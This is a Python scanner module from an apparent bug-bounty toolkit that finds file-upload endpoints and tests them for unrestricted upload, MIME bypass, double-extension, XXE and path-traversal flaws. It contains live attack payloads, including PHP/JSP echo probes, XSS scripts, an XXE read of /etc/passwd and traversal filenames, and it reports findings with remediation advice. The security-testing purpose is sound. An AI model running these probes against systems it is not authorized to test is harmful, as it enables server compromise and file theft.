# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""File Upload Vulnerability Testing — unrestricted upload, MIME bypass, path traversal via filename."""

import urllib.parse
import io
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    requests = None

from data.webfuzz import fetch_url

UPLOAD_PARAMS = [
    "file", "upload", "attachment", "image", "photo", "avatar",
    "document", "doc", "pdf", "media", "asset", "data", "blob",
    "content", "resource", "import", "resume", "cv", "report",
]

DANGEROUS_EXTENSIONS = [
    ("php",   "application/x-php",         "<?php echo 'vuln'; ?>"),
    ("php5",  "application/x-php",         "<?php echo 'vuln'; ?>"),
    ("phtml", "application/x-php",         "<?php echo 'vuln'; ?>"),
    ("jsp",   "application/x-jsp",         "<% out.println(\"vuln\"); %>"),
    ("asp",   "application/x-asp",         "<% Response.Write(\"vuln\") %>"),
    ("aspx",  "application/x-aspx",        "<% Response.Write(\"vuln\") %>"),
    ("shtml", "text/html",                  "<!--#echo var=\"DATE_LOCAL\" -->"),
    ("svg",   "image/svg+xml",             '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
    ("html",  "text/html",                  "<script>alert(1)</script>"),
    ("js",    "application/javascript",     "alert(1)"),
    ("xml",   "text/xml",                   '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'),
]

DOUBLE_EXT_NAMES = [
    "shell.php.jpg",
    "shell.php%00.jpg",
    "shell.php.png",
    "shell.jpg.php",
    "shell.pHp",
    "shell.PHP",
    "shell.php5",
]

MIME_BYPASS = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "application/octet-stream",
    "text/plain",
]

TRAVERSAL_FILENAMES = [
    "../../../etc/passwd.txt",
    "..%2F..%2F..%2Fetc%2Fpasswd.txt",
    "....//....//....//etc/passwd.txt",
    "/etc/passwd\x00.jpg",
]

INDICATORS = ["vuln", "alert(1)", "vuln_uploaded", "root:x:", "ami-id", "DATE_LOCAL"]


def _find_upload_forms(base_url: str, timeout: int) -> list[dict]:
    resp = fetch_url(base_url, timeout=timeout)
    if not resp:
        return []
    body = resp.get("body") or ""
    forms = []
    import re
    form_pat = re.compile(r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*action=["\']([^"\']*)["\']', re.I)
    generic_pat = re.compile(r'<input[^>]+type=["\']file["\']', re.I)
    for m in form_pat.finditer(body):
        action = m.group(1)
        if not action.startswith("http"):
            parsed = urllib.parse.urlparse(base_url)
            action = f"{parsed.scheme}://{parsed.netloc}{action}"
        forms.append({"action": action, "has_file_input": True})
    if not forms and generic_pat.search(body):
        forms.append({"action": base_url, "has_file_input": True})
    return forms


def _probe_upload(upload_url: str, ext: str, content_type: str, payload: str,
                  filename: str, mime_override: str, timeout: int) -> dict | None:
    if requests is None:
        return None
    try:
        files = {"file": (filename, io.BytesIO(payload.encode()), mime_override or content_type)}
        r = requests.post(upload_url, files=files, timeout=timeout, allow_redirects=True,
                          headers={"User-Agent": "BugBountyTool/1.0"}, verify=False)
        body = (r.text or "").lower()
        if r.status_code in (200, 201, 202) and any(ind.lower() in body for ind in INDICATORS):
            return {
                "url": upload_url,
                "filename": filename,
                "extension": ext,
                "mime_sent": mime_override or content_type,
                "status": r.status_code,
                "body_snippet": r.text[:200],
            }
        if r.status_code in (200, 201, 202) and "upload" in body and "success" in body:
            return {
                "url": upload_url,
                "filename": filename,
                "extension": ext,
                "mime_sent": mime_override or content_type,
                "status": r.status_code,
                "body_snippet": r.text[:200],
                "note": "Upload appeared to succeed (no execution confirmed)",
            }
    except Exception:
        pass
    return None


def _check_extension_bypass(upload_url: str, timeout: int) -> list[dict]:
    findings = []
    for ext, ctype, payload in DANGEROUS_EXTENSIONS[:5]:
        for mime in [ctype] + MIME_BYPASS[:2]:
            filename = f"test_bbt.{ext}"
            hit = _probe_upload(upload_url, ext, ctype, payload, filename, mime, timeout)
            if hit:
                findings.append({
                    "type": "Unrestricted File Upload",
                    "severity": "CRITICAL",
                    "url": upload_url,
                    "description": (
                        f"Dangerous file (.{ext}) accepted with Content-Type: {mime}. "
                        f"Remote code execution may be possible."
                    ),
                    "filename": filename,
                    "mime_sent": mime,
                    "steps_to_reproduce": (
                        f"1. POST multipart/form-data to {upload_url}\n"
                        f"2. Include file field: filename={filename}, Content-Type: {mime}\n"
                        f"3. Body: {payload[:80]}\n"
                        f"4. Observe file accepted and potentially executed."
                    ),
                    "impact": "Remote code execution, server compromise, data theft.",
                    "recommendation": (
                        "Validate file extensions against a strict allowlist. "
                        "Store uploads outside the web root. "
                        "Rename files on server side. "
                        "Validate MIME type server-side, not from the Content-Type header."
                    ),
                    "cvss": "9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                })
                break
    return findings


def _check_double_extension(upload_url: str, timeout: int) -> list[dict]:
    findings = []
    for fname in DOUBLE_EXT_NAMES:
        hit = _probe_upload(upload_url, "php", "image/jpeg",
                            "<?php echo 'vuln'; ?>", fname, "image/jpeg", timeout)
        if hit:
            findings.append({
                "type": "File Upload — Double Extension Bypass",
                "severity": "HIGH",
                "url": upload_url,
                "description": f"Double-extension filename '{fname}' accepted — server may execute the PHP portion.",
                "filename": fname,
                "steps_to_reproduce": (
                    f"1. POST multipart/form-data to {upload_url}\n"
                    f"2. filename={fname}, Content-Type: image/jpeg\n"
                    f"3. Observe file saved and potentially executed."
                ),
                "impact": "Possible code execution if web server is misconfigured to execute double-extension files.",
                "recommendation": "Strip all extensions and rename uploads to a safe random name. Validate the final extension only.",
                "cvss": "8.1 (High) — CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            })
            break
    return findings


def _check_path_traversal(upload_url: str, timeout: int) -> list[dict]:
    findings = []
    if requests is None:
        return findings
    for fname in TRAVERSAL_FILENAMES[:3]:
        try:
            files = {"file": (fname, io.BytesIO(b"traversal_test"), "text/plain")}
            r = requests.post(upload_url, files=files, timeout=timeout,
                              headers={"User-Agent": "BugBountyTool/1.0"}, verify=False)
            if r.status_code in (200, 201) and "success" in (r.text or "").lower():
                findings.append({
                    "type": "File Upload — Path Traversal via Filename",
                    "severity": "HIGH",
                    "url": upload_url,
                    "description": f"Filename with path traversal '{fname}' was accepted without sanitization.",
                    "filename": fname,
                    "steps_to_reproduce": (
                        f"1. POST multipart/form-data to {upload_url}\n"
                        f"2. Set filename={fname}\n"
                        f"3. Server accepted without stripping traversal sequences."
                    ),
                    "impact": "Overwrite arbitrary server files, plant web shells outside intended directories.",
                    "recommendation": "Use os.path.basename() to strip directory components from uploaded filenames.",
                    "cvss": "7.5 (High) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                })
                break
        except Exception:
            pass
    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 10, **kwargs) -> dict:
    findings: list[dict] = []
    upload_forms = _find_upload_forms(base_url, timeout)

    if not upload_forms:
        common_upload_paths = ["/upload", "/api/upload", "/file/upload", "/media/upload",
                               "/attachments", "/api/files", "/documents/upload"]
        parsed = urllib.parse.urlparse(base_url)
        for path in common_upload_paths:
            candidate = f"{parsed.scheme}://{parsed.netloc}{path}"
            r = fetch_url(candidate, timeout=timeout)
            if r and r.get("status") in (200, 201, 405):
                upload_forms.append({"action": candidate, "has_file_input": True})

    if not upload_forms:
        return {
            "findings": [],
            "summary": {
                "upload_endpoints_found": 0,
                "total_findings": 0,
                "note": "No file upload endpoints detected.",
            },
        }

    with ThreadPoolExecutor(max_workers=min(threads, len(upload_forms) * 3)) as ex:
        futures = []
        for form in upload_forms[:5]:
            url = form["action"]
            futures.append(ex.submit(_check_extension_bypass, url, timeout))
            futures.append(ex.submit(_check_double_extension, url, timeout))
            futures.append(ex.submit(_check_path_traversal, url, timeout))
        for fut in as_completed(futures):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    seen = set()
    deduped = []
    for f in findings:
        key = (f.get("type"), f.get("url"), f.get("filename"))
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    return {
        "findings": deduped,
        "summary": {
            "upload_endpoints_found": len(upload_forms),
            "total_findings": len(deduped),
        },
    }


if __name__ == "__main__":
    pass
